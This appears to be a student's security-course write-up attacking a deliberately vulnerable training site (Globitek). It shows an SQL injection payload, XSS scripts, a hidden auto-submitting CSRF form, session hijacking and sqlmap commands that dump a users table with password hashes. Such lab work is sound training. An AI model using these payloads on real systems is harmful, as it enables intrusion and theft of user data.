# Project 8 - Pentesting Live Targets

Time spent: 6 hours

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

<b>Vulnerability #1:</b> <u>SQL Injection</u> <br /> 
When we go to the Salespeople page on the Blue web site and click View to see the details, we can notice that the address have the following format:
```html
https://130.211.197.112/blue/public/staff/salespeople/show.php?id=5
```
we can inject the following sql code ``` ' OR SLEEP(5)=0--' ``` to see if it's injectable
```html
https://130.211.197.112/blue/public/staff/salespeople/show.php?id=' OR SLEEP(5)=0--'
```
We can notice the delay of the database, so our sql code was executed. Also if we just set ' as an id we will get the "database query failed" message


<kbd><img src="sql.gif" width="800"></kbd>
<br><br>
<br><br>


<b>Vulnerability #2:</b> Session Hijacking/Fixation<br />

Below is the example of session hijacking. Using the provided tool, I copied the active sessionID from the logged in user and set it in different browser. This alowed me to log in bypassing login/password page.
 
<kbd><img src="hijacking.gif" width="800" ></kbd>


## Green

<b>Vulnerability #1:</b> <u>Username Enumeration </u> <br /> 
The developer made a mistake while designing the span class for error messages. When random username and a random password is used, the response will contain classs called "failure":
```html
<span class="failure">Log in was unsuccessful.</span>
```
While when the existing username and random password is being used, the response will use different class - "failed" (which makes the output <b>bold</b>):
```html
<span class="failed">Log in was unsuccessful.</span>
```

<kbd><img src="username_enumeration.gif" width="800"></kbd>
<br><br>
<br><br>
<b>Vulnerability #2:</b> Cross-Site Scripting <br />
Contact Us page on the green web site has xss vulnarability. Just enter the code in the feedback field and submit. 
```html
<script>alert('Andrey found the XSS!');</script>
```
When the admin will visit the feedback page, the code will be triggered
 
<kbd><img src="xss.gif" width="800" ></kbd>


## Red

<b>Vulnerability #1:</b> <u>Insecure Direct Object Reference</u> <br /> 
When we go to the "Find a Salesperson" page on the Red web site and click on any name to see the details, we can notice that the address have the following format:
```html
https://130.211.197.112/red/public/salesperson.php?id=1
```
ids for the salespeople presented on the website are numbers that starts from 1. If we use number 10 as an id:
```html
https://130.211.197.112/red/public/salesperson.php?id=10
```
We can see the information of a new salesperson Testy McTesterson that are not public yet.
On the other sites when you change the id to 10, instead of the hidden information you go back to the page Find a Salesperson

<kbd><img src="idor.gif" width="800"></kbd>
<br><br>
<br><br>

<b>Vulnerability #2:</b> Cross-Site Request Forgery <br />
Red web site does not have CSRF protections on the admin area <br />
Below is the code of the web page with a photo of grumpy cat and the hidden form that allows to change the name of the salesperson from Kim to Mike
```html
<!doctype html>
<html lang="en">
  <head>
    <title>Grumpy cat</title>
  </head>
  <body onload="document.my_form.submit()">
  <h1>Grumpy cat</h1>
  <img src="grumpycat.jpg" alt="There should be a cat over here">
    <form action="https://130.211.197.112/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" > <br />
      <input type="hidden" name="csrf_token" value="" /> <br />
      <input type="text" name="first_name" value="Mike" /> <br />
      <input type="text" name="last_name" value="Barker" /><br />
      <input type="text" name="phone" value="555-352-9654" /><br />
      <input type="text" name="email" value="kbarker@salesperson.com" /><br />
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```
When the admin will visit the page, the code will be triggered, but admin won't be notified, because the form has the attribute ```style="display: none;"``` (which hides the form) and ```target="hidden_results"``` (which sends the response to hidden <iframe>)
 
<kbd><img src="csrfexploit.gif" width="800" loop="3"></kbd>

## Bonus Objective 1: 
Build on Objective #3 (SQL Injection). Experiment to see what other kinds of information you can get the database to reveal.<br />

I've used mysql tool to experiment with the sql injections. I was able to find out the database names, table names, columns, and user information

first command showed database type:
```
python2.7 sqlmap.py -u 'https://130.211.197.112/blue/public/staff/salespeople/show.php?id=5' --method POST --data "id=test" --cookie='PHPSESSID=gsdj4eshn8nqrdm6p85fn9g0i5'

it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
...
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 225 HTTP(s) requests:
...
[19:55:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
```
Second command showed database names
```
python2.7 sqlmap.py -u 'https://130.211.197.112/blue/public/staff/salespeople/show.php?id=5' --method POST --data "id=test" --cookie='PHPSESSID=gsdj4eshn8nqrdm6p85fn9g0i5' --dbs
...
available databases [7]:                                                                                                                        
[*] globitek_blue
[*] globitek_green
[*] globitek_red
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```
Third command got table names for globitek_blue database
```
python2.7 sqlmap.py -u 'https://130.211.197.112/blue/public/staff/salespeople/show.php?id=5' --method POST --data "id=test" --cookie='PHPSESSID=gsdj4eshn8nqrdm6p85fn9g0i5' --tables -D globitek_blue
...
Database: globitek_blue                                                                                                                         
[8 tables]
+-------------------------+
| countries               |
| failed_logins           |
| feedback                |
| salespeople             |
| salespeople_territories |
| states                  |
| territories             |
| users                   |
+-------------------------+
```
This command reveal user information
```
python2.7 sqlmap.py -u 'https://130.211.197.112/blue/public/staff/salespeople/show.php?id=5' --method POST --data "id=test" --cookie='PHPSESSID=gsdj4eshn8nqrdm6p85fn9g0i5' --dump -D globitek_blue -T users
...
+----+---------------------+-----------+-----------+---------------------+------------+--------------------------------------------------------------+
| id | email               | username  | last_name | created_at          | first_name | hashed_password                                              |
+----+---------------------+-----------+-----------+---------------------+------------+--------------------------------------------------------------+
| 1  | test@test.com       | jmonroe99 | Munroe    | NULL                | Jim        | $2y$11$Co5fHvH5Lgk2Zu0iHR46BO6fnqQt1pUljPbZOhk7bTU6hQFhjBJG. |
| 2  | lbt2000@nowhere.com | lbtables  | Tables    | 2016-06-03 19:33:54 | Bobby      | $2y$10$I.Jwfc8R3xaFwlAlPn5U3OLAQXrE0c2fakN8rR4j2TW0gRVMd6U6a |
| 3  | person@nowhere.com  | pperson   | Person    | 2017-01-01 02:50:26 | Pat        | $2y$11$FHZQn1eWZ3mbn11evb3CSeM20LCsJZI8yP9wS/UsOI6VWnx.7mKDa |
| 4  | newuser@example.com | newuser   | User      | 2018-03-29 04:13:16 | New        | $2y$11$j.h3yOe.TKGopHgkIbQsEOGX1I5vkzThsyi5yTq4fZYBFr4WtZo8i |
+----+---------------------+-----------+-----------+---------------------+------------+--------------------------------------------------------------+

```
Also I was able to get info about other databases on the server
```
python2.7 sqlmap.py -u 'https://130.211.197.112/blue/public/staff/salespeople/show.php?id=5' --method POST --data "id=test" --cookie='PHPSESSID=gsdj4eshn8nqrdm6p85fn9g0i5' --tables -D performance_schema

Database: performance_schema                                                                                                                                   
[87 tables]
+------------------------------------------------------+
| accounts                                             |
| cond_instances                                       |
| events_stages_current                                |
| events_stages_history                                |
| events_stages_history_long                           |
| events_stages_summary_by_account_by_event_name       |
...............
| threads                                              |
| user_variables_by_thread                             |
| users                                                |
| variables_by_thread                                  |
+------------------------------------------------------+
```
## Bonus Objective 2: 
Build on Objective #4 (Cross-Site Scripting). Experiment to see if you can use XSS to: a) direct the user to a new URL, b) read cookie data, c) set cookie data. <br />

direct the user to a new URL <br />

I used the following code:
```
<script type="text/javascript"> window.location.href = "http://www.yourdomain.com/somepage.html"; </script>
```
<kbd><img src="redirect.gif" width="800"></kbd>
<br><br>
<br><br>


